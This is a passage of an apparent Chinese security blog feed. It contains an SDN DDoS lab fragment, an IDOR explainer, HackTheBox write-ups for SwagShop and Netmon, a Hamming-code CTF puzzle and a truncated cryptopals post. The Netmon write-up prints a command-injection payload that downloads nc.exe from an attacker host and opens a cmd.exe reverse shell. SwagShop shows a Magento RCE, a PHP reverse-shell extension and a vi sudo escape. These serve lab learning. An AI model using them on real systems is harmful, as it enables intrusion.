#入端口</span><br><span class="line">&quot;priority&quot;:&quot;100&quot;, #优先级</span><br><span class="line">&quot;active&quot;: &quot;true&quot;, #是否激活</span><br><span class="line">&quot;actions&quot;: &quot;output=no-forward&quot; #动作</span><br><span class="line">&#125;</span><br><span class="line">### Drop ICMP包</span><br><span class="line">&#123;</span><br><span class="line">&quot;switch&quot;: &quot;00:00: 00:00:00:00:00:01&quot;,</span><br><span class="line">&quot;name&quot;: &quot;flow-test&quot;,</span><br><span class="line">&quot;cookie&quot;:&quot;0&quot;,</span><br><span class="line">&quot;in_port&quot;: &quot;1&quot;,</span><br><span class="line">&quot;eth_type&quot;:&quot;0x0800&quot;, #以太网类型IPV4</span><br><span class="line">&quot;ip_proto&quot;:&quot;0x01&quot;, #ICMP协议</span><br><span class="line">&quot;priority&quot;:&quot;100&quot;,</span><br><span class="line">&quot;active&quot;: &quot;true&quot;,</span><br><span class="line">&quot;actions&quot;: &quot;output=no-forward&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST -d @ddos.json  http://127.0.0.1:8080/wm/staticflowentrypusher/json #上传流表</span><br><span class="line">----------------------------------------------------</span><br><span class="line">$ curl -X DELETE -d&apos;&#123;&quot;name&quot;:&quot;flow-test&quot;&#125;&apos; \</span><br><span class="line">&gt; http://localhost:8080/wm/staticflowentrypusher/json #删除流表</span><br></pre></td></tr></table></figure><p>使用API提交</p><h3 id="实际情况更为复杂"><a href="#实际情况更为复杂" class="headerlink" title="实际情况更为复杂"></a>实际情况更为复杂</h3><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;本实验是基于SDN的DDoS检查与防御&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Ubuntu&lt;/li&gt;
&lt;li&gt;sFlow-R&lt;/li&gt;
&lt;li&gt;Mininet&lt;/li&gt;
&lt;li&gt;Floodlight (注意版本和jdk的问题)&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;其他问题不大&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安防" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E9%98%B2/"/>
    
      <category term="DDOS" scheme="http://www.lanbainan.cn/tags/DDOS/"/>
    
  </entry>
  
  <entry>
    <title>越权小测试</title>
    <link href="http://www.lanbainan.cn/2019/07/04/2019-07-04/"/>
    <id>http://www.lanbainan.cn/2019/07/04/2019-07-04/</id>
    <published>2019-07-04T08:44:00.000Z</published>
    <updated>2019-07-04T10:39:07.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="这是一个小实验"><a href="#这是一个小实验" class="headerlink" title="这是一个小实验"></a>这是一个小实验</h1><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p>A和B 具有相同权限，但是A可以通过攻击手段访问B的个人资料<br><a id="more"></a></p><blockquote><p><strong>基于用户身份ID</strong> </p><ul><li>在使用某个功能时通过用户提交的身份ID（用户ID、账号、手机号、证件号等用户唯一标识）来访问或操作对应的数据。</li></ul></blockquote><hr><blockquote><p><strong>基于对象ID</strong> </p><ul><li>在使用某个功能时通过用户提交的对象ID（如订单号、记录号）来访问或操作对应的数据。</li></ul></blockquote><hr><blockquote><p><strong>基于文件名</strong></p><ul><li>在使用某个功能时通过文件名直接访问文件，最常见于用户上传文件的场景。</li></ul></blockquote><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p>A普通权限和B管理员权限两个具有不同权限，A通过攻击获取B权限（管理员与user用户必须为同一个表(除非连续查询连个语句)）</p><blockquote><p><strong>未认证账户访问无需认证后能访问该功能</strong></p><ul><li>仅使用js跳转来限制未授权的用户访问(禁用js即可访问后台)</li></ul></blockquote><hr><blockquote><p><strong>不具备某个功能权限的账户认证后成功访问该功能</strong><br>提权骚操作</p></blockquote><hr><blockquote><p><strong>权限框架缺陷</strong></p><ul><li>权限控制框架是实现权限控制功能的基础，如果权限控制框架本身存在缺陷容易被攻陷会导致权限控制功能完全失效。在cookie中使用简单的权限标识来标记用户的权限等级或使用用户请求参数中所带的简单用户ID来控制用户权限，是典型的权限框架缺陷。</li></ul></blockquote><p>引用<a href="https://blog.csdn.net/Fly_hps/article/details/87088690" target="_blank" rel="noopener">@FLy_鹏程万里–业务逻辑漏洞探索之越权漏洞</a></p><h2 id="平行越权实验"><a href="#平行越权实验" class="headerlink" title="平行越权实验"></a>平行越权实验</h2><p>本账号基本信息<br><img src="https://i.loli.net/2019/07/04/5d1dc20c799de85326.png" alt="2.png"><br>修改userid将的到下一用户的资料<br><img src="https://i.loli.net/2019/07/04/5d1dbf4b2ddf192950.png" alt="1.png"><br><img src="https://i.loli.net/2019/07/04/5d1dc2cfe9b6d99362.png" alt="3.png"></p><p>平行越权一般只具有删改查权限</p><h2 id="垂直越权实验"><a href="#垂直越权实验" class="headerlink" title="垂直越权实验"></a>垂直越权实验</h2><p>这个天天都在做</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>平行漏洞挖掘<br><img src="https://i.loli.net/2019/07/04/5d1dd3358e2b268921.png" alt="4.png"><br>垂直越权挖掘<br><img src="https://i.loli.net/2019/07/04/5d1dd6a28bb7552736.png" alt="5.png"></p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;这是一个小实验&quot;&gt;&lt;a href=&quot;#这是一个小实验&quot; class=&quot;headerlink&quot; title=&quot;这是一个小实验&quot;&gt;&lt;/a&gt;这是一个小实验&lt;/h1&gt;&lt;h2 id=&quot;水平越权&quot;&gt;&lt;a href=&quot;#水平越权&quot; class=&quot;headerlink&quot; title=&quot;水平越权&quot;&gt;&lt;/a&gt;水平越权&lt;/h2&gt;&lt;p&gt;A和B 具有相同权限，但是A可以通过攻击手段访问B的个人资料&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>对SwagShop的测试</title>
    <link href="http://www.lanbainan.cn/2019/07/03/2019-07-03/"/>
    <id>http://www.lanbainan.cn/2019/07/03/2019-07-03/</id>
    <published>2019-07-03T01:18:00.000Z</published>
    <updated>2019-07-03T10:03:38.728Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SwagShop"><a href="#SwagShop" class="headerlink" title="SwagShop"></a>SwagShop</h1><p>靶机：10.10.10.140<br>kali：10.10.15.83<br>实验目的：找到flag<br>项目地址：<a href="https://www.hackthebox.eu/home/machines/profile/188" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/188</a><br><a id="more"></a></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# masscan -p 0-65535 192.168.67.135 --rate 1000</span><br></pre></td></tr></table></figure><p>开放<code>22</code>,<code>80</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p22,80 10.10.10.140</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)</span><br><span class="line">|_  256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home page</span><br></pre></td></tr></table></figure></p><p>80端口开放服务，百度可知<br>Magento是一套专业开源的电子商务系统<br><img src="https://i.loli.net/2019/07/03/5d1c14b74479798854.png" alt="1.png"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# searchsploit Magento</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/07/03/5d1c179fa46ae95785.png" alt="2.png"><br>令人注意的是由一个远程代码执行,将一些注释和代码修改一下<br><img src="https://i.loli.net/2019/07/03/5d1c1b77be59d67880.png" alt="3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# python 37977.py</span><br><span class="line">WORKED</span><br><span class="line">Check http://10.10.10.140/admin with creds forme:forme</span><br></pre></td></tr></table></figure></p><p>得到账户密码<code>forme:forme</code><br>后台登录<code>http://10.10.10.140/index.php/admin</code><br>安装<a href="https://github.com/lavalamp-/LavaMagentoBD" target="_blank" rel="noopener">扩展shell</a>,<code>System&gt;Magento Connect&gt;Magento Connect Manager</code>,将<code>app\code\community\Lavalamp\Connector\controllers\IndexController.php</code>内容替换为<code>/usr/share/webshells/php/php-reverse-shell.php</code>并修改IP和端口，重新打包为<code>.tgz</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf bd.tgz app package.xml skin</span><br></pre></td></tr></table></figure></p><p>安装扩展,打开页面<code>http://10.10.10.140/app/code/community/Lavalamp/Connector/controllers/IndexController.php</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ nc -nvlp 4444</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for www-data on swagshop:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on swagshop:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vi /var/www/html/*</span><br></pre></td></tr></table></figure><p>发现无需密码登录root<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">echo &quot;test&quot; &gt; test</span><br><span class="line">sudo /usr/bin/vi /var/www/html/test -c &apos;!sh&apos;</span><br><span class="line">cat /root/root.txt</span><br><span class="line">c2b087d66e14a652a3b86a130ac56721</span><br><span class="line"></span><br><span class="line">   ___ ___</span><br><span class="line"> /| |/|\| |\</span><br><span class="line">/_| 麓 |.` |_\           We are open! (Almost)</span><br><span class="line">  |   |.  |</span><br><span class="line">  |   |.  |         Join the beta HTB Swag Store!</span><br><span class="line">  |___|.__|       https://hackthebox.store/password</span><br><span class="line"></span><br><span class="line">                   PS: Use root flag as password!</span><br></pre></td></tr></table></figure></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>在解包打包时，没有查看官方文档，浪费了一定时间，不会就查文档，切记!切记!</p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;SwagShop&quot;&gt;&lt;a href=&quot;#SwagShop&quot; class=&quot;headerlink&quot; title=&quot;SwagShop&quot;&gt;&lt;/a&gt;SwagShop&lt;/h1&gt;&lt;p&gt;靶机：10.10.10.140&lt;br&gt;kali：10.10.15.83&lt;br&gt;实验目的：找到flag&lt;br&gt;项目地址：&lt;a href=&quot;https://www.hackthebox.eu/home/machines/profile/188&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.hackthebox.eu/home/machines/profile/188&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>对HTB Netmon的测试</title>
    <link href="http://www.lanbainan.cn/2019/06/21/2019-06-21/"/>
    <id>http://www.lanbainan.cn/2019/06/21/2019-06-21/</id>
    <published>2019-06-21T14:49:00.000Z</published>
    <updated>2019-06-24T13:17:06.929Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Netmon"><a href="#Netmon" class="headerlink" title="Netmon"></a>Netmon</h1><p>靶机：10.10.10.152<br>kali：10.10.15.83<br>一次有趣的实验<br>实验目的：找到flag<br><a id="more"></a><br>项目地址：<a href="https://www.hackthebox.eu/home/machines/profile/177" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/177</a></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>nmap启动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 10.10.10.152</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          Microsoft ftpd</span><br><span class="line">80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49664/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49680/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49681/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49691/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">51061/tcp open  tcpwrapped</span><br></pre></td></tr></table></figure></p><p>访问80，运行PRTG Network Monitor (NETMON)暂时不知道怎么用</p><p><img src="https://i.loli.net/2019/06/19/5d0a37cf9955f31844.png" alt="1.png"></p><p>访问21，有料<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ftp 10.10.10.152</span><br><span class="line">Connected to 10.10.10.152.</span><br><span class="line">220 Microsoft FTP Service</span><br><span class="line">Name (10.10.10.152:root): anonymous</span><br><span class="line">331 Anonymous access allowed, send identity (e-mail name) as password.</span><br><span class="line">Password:</span><br><span class="line">230 User logged in.</span><br><span class="line">Remote system type is Windows_NT.</span><br><span class="line">ftp&gt;ls -al</span><br><span class="line">200 PORT command successful.</span><br><span class="line">125 Data connection already open; Transfer starting.</span><br><span class="line">11-20-16  10:46PM       &lt;DIR&gt;          $RECYCLE.BIN</span><br><span class="line">02-03-19  12:18AM                 1024 .rnd</span><br><span class="line">11-20-16  09:59PM               389408 bootmgr</span><br><span class="line">07-16-16  09:10AM                    1 BOOTNXT</span><br><span class="line">02-03-19  08:05AM       &lt;DIR&gt;          Documents and Settings</span><br><span class="line">02-25-19  10:15PM       &lt;DIR&gt;          inetpub</span><br><span class="line">06-20-19  08:12AM                  538 output.txt</span><br><span class="line">06-20-19  07:32AM            738197504 pagefile.sys</span><br><span class="line">07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs</span><br><span class="line">02-25-19  10:56PM       &lt;DIR&gt;          Program Files</span><br><span class="line">02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)</span><br><span class="line">02-25-19  10:56PM       &lt;DIR&gt;          ProgramData</span><br><span class="line">02-03-19  08:05AM       &lt;DIR&gt;          Recovery</span><br><span class="line">06-20-19  08:14AM                   70 root.txt</span><br><span class="line">02-03-19  08:04AM       &lt;DIR&gt;          System Volume Information</span><br><span class="line">02-03-19  08:08AM       &lt;DIR&gt;          Users</span><br><span class="line">02-25-19  11:49PM       &lt;DIR&gt;          Windows</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure></p><p>发现<code>output.txt</code>,找到flag位置</p><p><img src="https://i.loli.net/2019/06/24/5d10ad1460d2b78263.png" alt="3.png"></p><p>在<code>/Users/Public</code>目录发现<code>user.txt</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp&gt; get user.txt</span><br><span class="line">λ cat user.txt</span><br><span class="line">dd58ce67b49e15105e88096c8d9255a5</span><br></pre></td></tr></table></figure></p><p>下载PRTG配置文件<code>ProgramData/Paessler/PRTG Network Monitor</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PRTG Configuration.old</span><br><span class="line">PRTG Configuration.old.bak</span><br><span class="line">PRTG Graph Data Cache.dat</span><br></pre></td></tr></table></figure></p><p>在<code>PRTG Configuration.old.bak</code>文件中找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">     &lt;/dbcredentials&gt;</span><br><span class="line">     &lt;dbpassword&gt;</span><br><span class="line">&lt;!-- User: prtgadmin --&gt;</span><br><span class="line">PrTg@dmin2018</span><br><span class="line">     &lt;/dbpassword&gt;</span><br><span class="line">     &lt;dbtimeout&gt;</span><br></pre></td></tr></table></figure></p><p>Username:prtgadmin<br>Password:PrTg@dmin2018<br>结果登录不起<br>多番尝试将2018改为2019,即可<br>根据网站服务发现远程代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit PRTG</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/24/5d10ad867b0a085358.png" alt="4.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.152/editnotification.htm?id=301&amp;tabid=1</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/06/24/5d10c7f1378c277690.png" alt="5.png"></p><p>上传nc（添加加了半天用户加不起）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test.txt; powershell -c&quot;(new-object System.Net.WebClient).DownloadFile(&apos;http://10.10.15.71:80/nc.exe&apos;,&apos;C:\nc.exe&apos;)&quot;</span><br><span class="line">test.txt;C:\nc.exe 10.10.15.71 8888 -e cmd.exe</span><br><span class="line">λ nc -nvlp 8888</span><br><span class="line">C:\Windows\system32&gt;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/06/24/5d10cabb4064731759.png" alt="6.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>密码更新，漏洞查找<br>注：记住密码好坑！好坑！好坑！</p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Netmon&quot;&gt;&lt;a href=&quot;#Netmon&quot; class=&quot;headerlink&quot; title=&quot;Netmon&quot;&gt;&lt;/a&gt;Netmon&lt;/h1&gt;&lt;p&gt;靶机：10.10.10.152&lt;br&gt;kali：10.10.15.83&lt;br&gt;一次有趣的实验&lt;br&gt;实验目的：找到flag&lt;br&gt;
    
    </summary>
    
      <category term="信息安全" scheme="http://www.lanbainan.cn/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="安全测试" scheme="http://www.lanbainan.cn/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶机实验" scheme="http://www.lanbainan.cn/tags/%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>鸡藕椒盐味浅析</title>
    <link href="http://www.lanbainan.cn/2019/06/16/2019-06-16/"/>
    <id>http://www.lanbainan.cn/2019/06/16/2019-06-16/</id>
    <published>2019-06-16T01:12:00.000Z</published>
    <updated>2019-06-20T07:05:00.345Z</updated>
    
    <content type="html"><![CDATA[<p>#题目：<br>公司食堂最新出了一种小吃，叫鸡藕椒盐味汉堡，售价八块钱，为了促销，上面有一个验证码，输入后可以再换取一个汉堡。但是问题是每个验证码几乎都有错误,而且打印的时候倒了一下。小明买到了一个汉堡，准备还原验证码，因为一个吃不饱啊~~<a id="more"></a>验证码如下：1100 1010 0000 。把答案哈希一下就可以提交了。(答案为正确值(不包括数字之间的空格)的32位md5值的小写形式)<br><!--more--></p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>仔细阅读</p><ul><li><a href="https://www.cnblogs.com/dushikang/p/8334776.html" target="_blank" rel="noopener">奇偶校验位</a></li><li><a href="https://blog.csdn.net/blue_starry_sky/article/details/53997548" target="_blank" rel="noopener">汉明码原理</a></li></ul><p>公式：2^k≥n+k+1</p><h2 id="0x01-校验位"><a href="#0x01-校验位" class="headerlink" title="0x01 校验位"></a>0x01 校验位</h2><table><thead><tr><th style="text-align:center"><strong>编号</strong></th><th style="text-align:center">1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>……</th></tr></thead><tbody><tr><td style="text-align:center"><strong>二进制</strong></td><td style="text-align:center">0001</td><td>0010</td><td>0011</td><td>0100</td><td>0101</td><td>0110</td><td>0111</td><td>1000</td><td>1001</td><td>……</td></tr></tbody></table><p>校验位：<code>1</code>、<code>2</code>、<code>4</code>、<code>8</code></p><h2 id="0x02-排列"><a href="#0x02-排列" class="headerlink" title="0x02 排列"></a>0x02 排列</h2><table><thead><tr><th style="text-align:center"><strong>汉明码</strong></th><th style="text-align:center">0</th><th>0</th><th>0</th><th>0</th><th>0</th><th>1</th><th>0</th><th>1</th><th>0</th><th>0</th><th>1</th><th>1</th></tr></thead><tbody><tr><td style="text-align:center"><strong>校验位</strong></td><td style="text-align:center">0</td><td>0</td><td>-</td><td>0</td><td>-</td><td>-</td><td>-</td><td>1</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td style="text-align:center"><strong>信息位</strong></td><td style="text-align:center">-</td><td>-</td><td>0</td><td>-</td><td>0</td><td>1</td><td>0</td><td>-</td><td>0</td><td>0</td><td>1</td><td>1</td></tr></tbody></table><p>发送端校验位：1000<br>得到：11000100</p><h2 id="0x03-纠错"><a href="#0x03-纠错" class="headerlink" title="0x03 纠错"></a>0x03 纠错</h2><table><thead><tr><th style="text-align:center">C</th><th style="text-align:center">1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th></tr></thead><tbody><tr><td style="text-align:center"><strong>信息位</strong></td><td style="text-align:center">0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td></tr></tbody></table><p>接收端检验位：<br>P4=C5+C6+C7+C8=0+0+1+1=0<br>P3=C2+C3+C4+C8=0+1+0+1=0<br>P2=C1+C3+C4+C6+C7=0+1+0+0+1=0<br>P1=C1+C2+C4+C5+C7=0+0+0+0+1=1</p><table><thead><tr><th style="text-align:center"><strong>发送端校验位</strong></th><th style="text-align:center">1</th><th>0</th><th>0</th><th>0</th></tr></thead><tbody><tr><td style="text-align:center"><strong>接收端检验位</strong></td><td style="text-align:center">0</td><td>0</td><td>0</td><td>1</td></tr><tr><td style="text-align:center"><strong>监督位</strong></td><td style="text-align:center">1</td><td>0</td><td>0</td><td>1</td></tr></tbody></table><p>当监督位为：0000。说明接收方生成的校验位和收到的校验位相同，否则说明出错。<br>将<code>1001</code>转换为10进制<code>9</code>,说明验证码第9位出错，<br>正确的是：<code>110110100000</code>,md5哈希一下即答案</p><h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#题目：&lt;br&gt;公司食堂最新出了一种小吃，叫鸡藕椒盐味汉堡，售价八块钱，为了促销，上面有一个验证码，输入后可以再换取一个汉堡。但是问题是每个验证码几乎都有错误,而且打印的时候倒了一下。小明买到了一个汉堡，准备还原验证码，因为一个吃不饱啊~~
    
    </summary>
    
      <category term="杂项" scheme="http://www.lanbainan.cn/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
      <category term="CTF" scheme="http://www.lanbainan.cn/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>XOR编码实现</title>
    <link href="http://www.lanbainan.cn/2019/06/12/2019-06-12/"/>
    <id>http://www.lanbainan.cn/2019/06/12/2019-06-12/</id>
    <published>2019-06-12T14:49:00.000Z</published>
    <updated>2019-06-15T13:36:36.455Z</updated>
    
    <content type="html"><![CDATA[<h1 id="The-cryptopals-crypto-challenges"><a href="#The-cryptopals-crypto-challenges" class="headerlink" title="The cryptopals crypto challenges"></a>The cryptopals crypto challenges</h1><p>可以使用大多数主流语言，解决问题<br>环境：Python3.7.0<br>项目地址：<a href="http://cryptopals.com/sets/1/challenges/2" target="_blank" rel="noopener">http://cryptopals.com/sets/1/challenges/2</a><br><a id="more"></a> </p><h2 id="Fixed-XOR"><a href="#Fixed-XOR" class="headerlink" title="Fixed XOR"></a>Fixed XOR</h2><p><img src="https://i.loli.net/2019/06/12/5d00eb12704fe69057.png" alt="1.png"><br>例如：EVA and LAN</p><ul><li><p><strong>1</strong> - 将字符串–&gt;二进制</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 